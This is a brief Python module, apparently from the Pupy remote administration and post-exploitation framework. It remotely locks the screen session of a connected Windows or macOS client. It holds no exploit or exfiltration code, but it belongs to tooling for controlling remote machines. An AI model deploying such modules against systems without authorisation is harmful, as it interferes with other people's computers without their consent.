# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__ = 'PupyMod'


@config(compat=["windows", "darwin"], cat="manage", tags=["lock", "screen", "session"])
class PupyMod(PupyModule):
    """ Lock the session """

    dependencies = ['lockscreen']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="lock_screen", description=cls.__doc__)

    def run(self, args):
        ok = False

        lock = self.client.remote('lockscreen', 'lock')
        if lock():
            self.success('Locked')
        else:
            self.error('Failed to lock')
